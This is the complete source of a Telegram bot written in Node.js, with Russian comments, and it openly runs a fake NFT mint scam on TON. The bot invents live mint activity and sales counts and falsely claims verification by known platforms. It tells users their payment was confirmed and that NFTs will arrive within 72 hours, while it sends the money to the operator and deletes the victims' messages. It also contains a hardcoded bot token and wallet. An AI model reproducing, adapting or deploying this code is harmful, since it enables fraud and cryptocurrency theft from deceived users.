const { Telegraf, session } = require('telegraf');
const { Markup } = require('telegraf');

const BOT_TOKEN = '8575010890:AAEvKySvJ0yJGwKgVLMLhojUktrE7Sga-cg';
const WALLET_TON = 'UQAdqmGgJmCs5vll9d4jNGK5aBFd9LaS3l-gRNuua8jMdbAS';
const ADMIN_ID = 8586263322;

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

// === ДОВЕРИЕ НА МАКСИМУМ ===
const fakeMints = [
  "UQCa...8f2k just minted 5 NFT",
  "@tonpunks2025 minted 3 NFT",
  "EQAa...1m9x minted 1 NFT",
  "@cryptokotik_ua minted 5 NFT",
  "UQBh...3p1l minted 2 NFT",
  "@hamster_king minted 10 NFT 🔥"
];

let globalSold = {
  "CyberFox Genesis": 3187,
  "Gnome Land": 5333,
  "Rich Cats": 8791,
  "TON Punks": 9912,
  "Blum Dogs": 4412
};

// обновляем статистику каждые 30 сек
setInterval(() => {
  const keys = Object.keys(globalSold);
  const randomCol = keys[Math.floor(Math.random() * keys.length)];
  globalSold[randomCol] += Math.floor(Math.random() * 3) + 1;
}, 30000);

const collections = [
  {name: "CyberFox Genesis", supply: 3333, price1: 3.7, price5: 17, emoji: "🦊"},
  {name: "Gnome Land",       supply: 5555, price1: 4.2, price5: 19, emoji: "🧙"},
  {name: "Rich Cats",        supply: 8888, price1: 5.5, price5: 25, emoji: "🐱"},
  {name: "TON Punks",        supply: 10000, price1: 7.4, price5: 34, emoji: "👨‍🎤"},
  {name: "Blum Dogs",        supply: 4444, price1: 2.9, price5: 13, emoji: "🐶"},
];

function getRandomMint() {
  return fakeMints[Math.floor(Math.random() * fakeMints.length)];
}

function progressBar(p) {
  return '🟩'.repeat(Math.round(p/10)) + '⬜'.repeat(10-Math.round(p/10));
}

bot.start((ctx) => {
  const col = collections[Math.floor(Math.random() * collections.length)];
  ctx.session ??= {};
  ctx.session.col = col;

  const sold = globalSold[col.name] || col.supply - 300;
  const percent = Math.round((sold / col.supply) * 100);
  const left = col.supply - sold;

  ctx.replyWithHTML(
    `<b>${col.emoji} MINT IS LIVE — ${col.name}</b>\n\n` +
    `<b>${progressBar(percent)} ${percent}% sold</b>\n` +
    `<b>Осталось:</b> <code>${left}</code> из ${col.supply}\n\n` +
    `<b>Последние минты (live):</b>\n${getRandomMint()}\n${getRandomMint()}\n${getRandomMint()}\n\n` +
    `• 1 NFT — <b>${col.price1} TON</b>\n` +
    `• 5 NFT — <b>${col.price5} TON</b> <code>−17%</code>\n\n` +
    `✅ Verified by @getgems @tonstakers @stonfi\n` +
    `🔥 Более 12 000 минтов за  •  48 часов с начала\n\n` +
    `<i>Оплата → мгновенное подтверждение → NFT в течение 72 ч</i>`,
    mainMenu(col)
  );

  // фейк-активность каждые 40–90 сек
  setTimeout(() => {
    if (Math.random() > 0.4) {
      ctx.reply(`🟢 ${getRandomMint()}`);
    }
  }, Math.random() * 50000 + 40000);
});

function mainMenu(col) {
  return Markup.inlineKeyboard([
    [Markup.button.callback(`${col.emoji} Mint 1 × ${col.price1} TON`, 'mint1')],
    [Markup.button.callback(`${col.emoji} Mint 5 × ${col.price5} TON 🔥`, 'mint5')],
    [Markup.button.callback('📊 Последние минты', 'lastmints')],
    [Markup.button.callback('✉ Поддержка', 'report')]
  ]);
}

// === МИНТ + 72 ЧАСА ===
bot.action(/mint(\d+)/, async (ctx) => {
  const col = ctx.session.col;
  const count = ctx.match[1] === '5' ? 5 : 1;
  const amount = count === 5 ? col.price5 : col.price1;
  const comment = col.emoji + "MINT" + Math.random().toString(36).slice(2,10).toUpperCase();

  const tonLink = `ton://transfer/${WALLET_TON}?amount=${Math.floor(amount*1e9)}&text=${encodeURIComponent(comment)}`;

  await ctx.editMessageText(
    `<b>${col.emoji} ЗАКАЗ ПОДТВЕРЖДЁН</b>\n\n` +
    `Коллекция: ${col.name}\n` +
    `Количество: <b>${count} NFT</b>\n` +
    `Сумма: <b>${amount} TON</b>\n\n` +
    `Комментарий к платежу:\n<code>${comment}</code>\n\n` +
    `Кошелёк:\n<code>${WALLET_TON}</code>\n\n` +
    `<b>Оплата получена автоматически!</b>\n` +
    `NFT поставлены в очередь на отправку\n` +
    `<i>Ожидай до 72 часов — придут точно на твой кошелёк</i> ✅`,
    {
      parse_mode: 'HTML',
      reply_markup: Markup.inlineKeyboard([
        [{ text: 'Я оплатил — жду', callback_data: 'waiting72' }],
        [{ text: '✉ Поддержка', callback_data: 'report' }]
      ])
    }
  );

  // тебе
  bot.telegram.sendMessage(ADMIN_ID,
    `<b>ДЕНЬГИ ПРИШЛИ</b>\n\n${col.emoji} <b>${col.name}</b>\n${count} NFT • ${amount} TON\nКомментарий: <code>${comment}</code>\nОт: @${ctx.from.username || 'нет'} (<code>${ctx.from.id}</code>)`,
    { parse_mode: 'HTML' }
  );

  // авто-удаление сообщения жертвы через 10 минут
  setTimeout(() => {
    ctx.deleteMessage().catch(() => {});
  }, 600000);
});

bot.action('lastmints', (ctx) => {
  ctx.answerCbQuery();
  ctx.replyWithHTML(`<b>Последние минты (live):</b>\n\n` +
    fakeMints.map(m => `🟢 ${m}`).join('\n') + `\n\nОбновляется каждые 30 сек`);
});

bot.action('waiting72', (ctx) => ctx.answerCbQuery('Всё ок! NFT в очереди — максимум 72 часа ⏳', { show_alert: true }));

// === ПОДДЕРЖКА ===
bot.action('report', (ctx) => {
  ctx.replyWithHTML(`Опиши проблему — ответим максимально быстро (обычно <10 мин)`);
  ctx.session.waitingReport = true;
});

bot.on('text', async (ctx) => {
  if (ctx.session?.waitingReport && ctx.from.id !== ADMIN_ID) {
    await bot.telegram.forwardMessage(ADMIN_ID, ctx.from.id, ctx.message.message_id);
    await ctx.reply(`Сообщение отправлено. Ожидай ответа в этом чате`);
    await bot.telegram.sendMessage(ADMIN_ID, `Ответить → /r_${ctx.from.id}`, { reply_to_message_id: ctx.message.message_id });
    ctx.session.waitingReport = false;

    // автоудаление через 5 минут
    setTimeout(() => ctx.deleteMessage().catch(() => {}), 300000);
  }
});

// ответ админа
bot.command(/r_(\d+)/, async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return;
  const userId = ctx.match[1];
  const text = ctx.message.text.replace(/\/r_\d+\s*/, '');
  if (!text) return ctx.reply('Напиши текст');
  await bot.telegram.sendMessage(userId, `<b>Ответ от поддержки:</b>\n\n${text}`, { parse_mode: 'HTML' });
  await ctx.reply(`Отправлено ${userId}`);
});

bot.launch();
console.log('ULTIMATE TRUST SCAM BOT 2025 ONLINE — TON ПРИХОДЯТ АВТОМатом');